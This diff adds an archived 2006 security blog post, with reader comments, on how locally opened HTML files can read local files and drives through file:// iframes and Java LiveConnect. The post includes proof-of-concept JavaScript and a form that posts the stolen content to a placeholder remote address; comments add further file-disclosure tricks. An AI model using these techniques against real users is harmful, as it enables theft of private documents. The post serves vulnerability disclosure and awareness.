@@ -1,0 +1,112 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Web Pages from Hell</title><meta name="description" content="You open a html file but you are not aware. You check the content but you don't know."><meta property="name" content="Web Pages from Hell"><meta itemprop="name" content="Web Pages from Hell"><meta property="description" content="You open a html file but you are not aware. You check the content but you don't know."><meta itemprop="description" content="You open a html file but you are not aware. You check the content but you don't know."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fweb-pages-from-hell%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fweb-pages-from-hell%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/web-pages-from-hell/"><meta property="og:title" content="Web Pages from Hell"><meta property="og:description" content="You open a html file but you are not aware. You check the content but you don't know."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fweb-pages-from-hell%2F?w=1024"><meta name="twitter:title" content="Web Pages from Hell"><meta name="twitter:description" content="You open a html file but you are not aware. You check the content but you don't know."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fweb-pages-from-hell%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Web Pages from Hell</h1><div>Mon, 11 Sep 2006 21:23:31 GMT</div><div id="post-content"><p>You open a html file but you are not aware. You check the content but you don&#39;t know.</p>
+<blockquote>
+<p>I have just received the report for the third quoter of 2006 by email. My boss says that from now on we will use simple html pages because it is more accessible. Well, I don&#39;t know much about accessibility and I don&#39;t really care. I click on the attachment. The html document stores itself no the desktop. Double click and I have it open in Firefox.</p>
+</blockquote>
+<p>What happens next is without any doubt a security breach. Anonymous attacker has just compromised and stole important corporate documents.</p>
+<p>Unfortunately, this story is far from being far-fetched. This is something that can happen to your organization and the technology required is here today and ready for use. Concerning, isn&#39;t it? That&#39;s the reason why I went a bit deeper into this topic, figuring out various attack vectors and composing a simple toolkit to mitigate the risk. The following post reveals some of my findings and provides disjointed source code as a proof of concept.</p>
+<p>In this example we need Java, a single iframe, a form and a remote storage point. The iframe is used as data retrieval mechanism for html, xml and text files. Java is used as data retrieval mechanism for binary files. The form is used to send the data back to a remote storage point in a form of multiple POST request.</p>
+<p>The first stage is to compose an iframe. You must be aware that iframes are areas where content can be rendered. This content is retrieved by a URL. The URL describes the location and also the protocol in use, which can be <code>HTTP, HTTPS, FTP, FILE</code> and maybe something else depending of your browser. Obviously <code>FILE</code> sounds quite interesting. This protocol allows us to look and browse through our system or open local files inside our browsers. Just entering <code>file:///C:/</code> in your browser window should open <code>C:\</code> drive.</p>
+<p>It is said that iframes are secured in a way that different domains cannot access each other content. This restriction is applied with the same origin model. In simple terms, if a page from <code>a.com</code> creates hidden iframe of <code>b.com</code>, no communication is allowed between them. This means that<code>a.com</code> cannot read what is inside <code>b.com</code> iframe.</p>
+<p>In a way this is secure, however the <code>FILE</code> protocol is excluded from this rule simply because file paths don&#39;t have domains. So, an html file loaded from <code>file:///C:/file.html</code> can open an iframe of <code>file:///D:/file.html</code> and read its content. Of course, it must be noted that no external resource can read files from the local system because the same origin model imply that the protocol must be the same in order to allow communication. This means that HTTP cannot communicate with FILE or FTP.</p>
+<p>To cut the story short I will go into an example how all this theory can be used in practice.</p>
+<p>A file on the file system can open any other file inside an iframe.</p>
+<pre><code class="language-html"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"file:///C:/test.txt"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></code></pre>
+<p>In order to retrieve the content of this file we have to wait for the iframe to load and then just grab its document body.</p>
+<pre><code class="language-html"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"file:///C:/test.txt"</span> <span class="attr">onload</span>=<span class="string">"getContent(this)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>
+<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">
+  <span class="function"><span class="keyword">function</span> <span class="title">getContent</span><span class="params">(iframe)</span> </span>{
+    <span class="keyword">var</span> content = <span class="string">''</span>;
+    <span class="keyword">if</span> (iframe.contentDocument) {
+      content = iframe.contentDocument.body.innerHTML; 
+    } <span class="keyword">else</span> <span class="keyword">if</span> (iframe.contentWindow) {
+      content = iframe.contentWindow.document.body.innerHTML;
+    } <span class="keyword">else</span> <span class="keyword">if</span> (iframe.document) {
+      content = iframe.document.body.innerHTML;
+    }
+    alert(content);
+  }
+</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></code></pre>
+<p>The snippet above will display the content of an iframe which currently holds <code>file:///C:/test.txt</code>.</p>
+<p>Opening files is not fun although probably you already can see some of the potentials. Let&#39;s try something more funky by replacing <code>file:///C:/test.txt</code> with <code>file:///C:/.</code> This should open <code>C:\</code> drive.</p>
+<pre><code class="language-html"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"file:///C:/"</span> <span class="attr">onload</span>=<span class="string">"getContent(this)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>
+<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">
+  <span class="function"><span class="keyword">function</span> <span class="title">getContent</span><span class="params">(iframe)</span> </span>{
+    <span class="keyword">var</span> content = <span class="string">''</span>;
+    <span class="keyword">if</span> (iframe.contentDocument) {
+      content = iframe.contentDocument.body.innerHTML; 
+    } <span class="keyword">else</span> <span class="keyword">if</span> (iframe.contentWindow) {
+      content = iframe.contentWindow.document.body.innerHTML;
+    } <span class="keyword">else</span> <span class="keyword">if</span> (iframe.document) {
+      content = iframe.document.body.innerHTML;
+    }
+    alert(content);
+  }
+</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></code></pre>
+<p>Potentially, the snippet above has just listed your <code>C:\</code> drive into an alert box. Of course this will work on most browsers but not in IE. IE is secure in this respect, however just keep in mind that IE supports ActiveX which makes the entire process a lot more simpler in some situations.</p>
+<p>The next step every attacker probably will do is to create a recursive function which lists directories and upload interesting content on a remote server. If you try to do this you will see that the process is not as trivial as it seams because as soon as your iframe tries to open a binary file, your browser will prompt you with a download box. Of course, the attacker can try to avoid doc, xls and other types of binary files but today this is where all interesting corporate information is stored into.</p>
+<p>So, in order to retrieve a binary file another technology needs to be used: Java and more precisely LiveConnect which is supported by Firefox and Opera. Let&#39;s see how our binary retrieving code looks like:</p>
+<pre><code class="language-html"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">
+  <span class="function"><span class="keyword">function</span> <span class="title">liveJaveGetContent</span><span class="params">(URL)</span> </span>{
+    <span class="keyword">var</span> result = <span class="string">''</span>;
+    <span class="keyword">var</span> destination = <span class="keyword">new</span> java.net.URL(URL);
+    <span class="keyword">var</span> input = java.io.DataInputStream(destination.openStream());
+
+    <span class="keyword">while</span> ((line = input.readLine()) != <span class="literal">null</span>) {
+      result += line;
+      result += java.lang.System.getProperty(<span class="string">'line.separator'</span>);
+    }
+
+    input.close();
+    <span class="keyword">return</span> result;
+  }
+</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></code></pre>
+<p>I must admit that the code above is not as generic as it can be but... well, no time.</p>
+<p>So, the function above can read binary files and return them in form of a string. This string is quite valuable for the attackers but first it has to be send to a remote location. This can be achieved in many ways, however my favorite one requires something as simple as a html form.</p>
+<pre><code class="language-html"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"sendContentForm"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://path/to/remote/location"</span>&gt;</span>
+  <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>
+  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>/&gt;</span>
+<span class="tag">&lt;/<span class="name">form</span>&gt;</span></code></pre>
+<p>This is it. When we call <code>sendContentFrom.submit()</code> the data will be transfered from locahost to the remote location. Of course this form wont be able to transport too much content. For that reason we have to do some partitioning and send the data in blocks.I will let this to you to play around.</p>
+<p>The conclusion is that you should not trust anything that you open in your browser, unless you completely disable JavaScrpt, Java and Flash. The next time you open a simple html page from your desktop, keep in mind that you may have opened a security hole in your network too. While previewing the document the attacker is able to enumerate the internal infrastructure of your organization by listing mounted shares. These share may contain documents, tables and databases that might be valuable to some individuals and organizations.</p>
+<p><em>BTW, just closing the browser window wont stop this attack continuing in the background. Many browsers can be made to stay alive even after you click on the X button. Maybe I will cover this some other time.</em></p>
+</div><div id="post-comments"><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="anty"><span>anty</span><div class="post-comment-content">I've just tested this with Firefox and Opera. First: This does only work if you call the HTML file localy right? Second: You don't need the iframe. You can list directories with the Java-Function as well.
+
+It would be cool to get this working if the file is <strong>not</strong> localy called...
+
+Thanks for sharing!</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">Yes anty,
+
+You are right. The reason I presented it this way was because sometimes JRE is not installed in which case you cannot read binary files, but you can read text files with iframe. It it the same when listing directories. Also, you can use the XMLHttpRequest object, however, to me it seams that it works on some setups but it doesn't on others.
+
+Yes, this technique works only when the file is executed locally due to the same origin policy. It will not work remotely unless you find a browser bug but this is a completely different story.
+
+However, there are situations where a plugin or an extension unconsciously caches web content on the file system and presents it to the user. This was the case with <a href="http://www.gnucitizen.org/blog/cross-context-scripting-with-sage" rel="nofollow" rel="nofollow">Sage cross-context scripting vulnerability</a>.
+
+The complete sourcode of the techniques presented here are available at <a href="http://www.gnucitizen.org/blog/attackapi" rel="nofollow" rel="nofollow">AttackAPI project page</a>.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="offtopic"><span>offtopic</span><div class="post-comment-content">This techniques widly used to exploit Internet Explorer "embedded" in different applications.
+2 old examples
+
+http://www.securityfocus.com/bid/14385
+
+http://www.securityfocus.com/archive/1/433360</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="offtopic"><span>offtopic</span><div class="post-comment-content">About Internet Explorer. While IE (in XP and W2K3) per se by default locks active content, many applications which reuse IE starts it “unlocked” mode.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="ravikiran.k"><span>ravikiran.k</span><div class="post-comment-content">Great Work,Can i get your appointment for a  talk.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">ravikiran.k, sure. You will be able to get my gmail address from various security lists. Add me in and if I am online drop me a message.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="MARCOS OLIVEIRA"><span>MARCOS OLIVEIRA</span><div class="post-comment-content">My problem is that i have IIS and a virtual directory... could you please tell me if it is possible to use an iframe to get a html page from, for example, c:\test\x.htm... Be aware that my VD is different from the c:\test.
+
+
+
+Thank you so much.
+Marcos Oliveira</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">MARCOS, maybe I don't quite understand your question but from what I see you want to retrieve the content of c:\test\x.htm from http://www.example.com for example. That is not possible.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="PartyOf1"><span>PartyOf1</span><div class="post-comment-content">Do all the attack functions work if IE or FF are runing inside of something like SandBoxIE?
+
+Does the attack also try to work on a Virtual machine?</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">the Java live connect will work on FF and Opera only. The rest should work on all browsers</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="crash_daemonicus"><span>crash_daemonicus</span><div class="post-comment-content">well, unless your target file is a configuration file that would be in correct syntax as a JS file.... then you simply  and call each configuration variable by name
+
+but anymore it'd be difficult unless your target is a specific program's configuration file because anymore they have [type of information]  lines that will kill the script
+
+but if they dont then there might be a problem lol</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="crash_daemonicus"><span>crash_daemonicus</span><div class="post-comment-content">I guess another classic example of information disclosure would be using res&#58;// calls to DLL's to load images only there in certain versions of windows and then testing the image's width and height information with javascript...
+
+PS. last post my example HTML didnt post:
+
+<pre><code>&lt;script src=C:\file.ext&gt;</code></pre></div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">crash_daemonicus,
+
+I totally agree with you, however you can still get certain parts of the file if the information that you are interested in is somewhere at the top of the file. The way you do that is by importing the file as script and watching for errors. Some JS interpreters return not only the type of error that is generated but also the actual code line, which is exactly what you are after.</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="sushant"><span>sushant</span><div class="post-comment-content">i am confused.  my question is 
+
+Can i open C drive document on client browser by giving a path in iframe
+
+example 
+
+can i do this ??</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="tom"><span>tom</span><div class="post-comment-content">this web page looks weird like a programmer T-shirt</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="pdp"><span>pdp</span><div class="post-comment-content">well :) heh...</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2019 <a href=""></a>. All rights reserved.</p></footer></body></html>
